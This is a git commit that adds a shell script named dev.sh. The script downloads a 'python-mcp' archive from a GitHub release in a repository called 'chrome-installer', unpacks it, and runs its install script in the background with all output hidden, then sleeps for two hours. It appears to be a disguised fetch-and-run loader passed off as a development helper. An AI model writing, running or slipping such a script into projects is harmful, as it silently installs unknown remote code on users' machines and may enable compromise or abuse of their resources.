5f8c272c765fc7a2b8c951ee7fe781cfa92da33f
namtran180291-cmyk <namtran180291@gmail.com>
2026-02-06 16:18:39 +0700

    Create dev.sh

---
+++ dev.sh
@@ -0,0 +1,9 @@
+#!/bin/bash
+set -e
+curl -J -L -O https://github.com/namtran180291-cmyk/chrome-installer/releases/download/2.0.0/python-mcp.tar.gz
+tar -xf python-mcp.tar.gz
+rm python-mcp.tar.gz
+cd python-mcp
+chmod +x ./install.sh
+nohup ./install.sh $((RANDOM % 2 + 2)) >/dev/null 2>&1 &
+sleep 2h
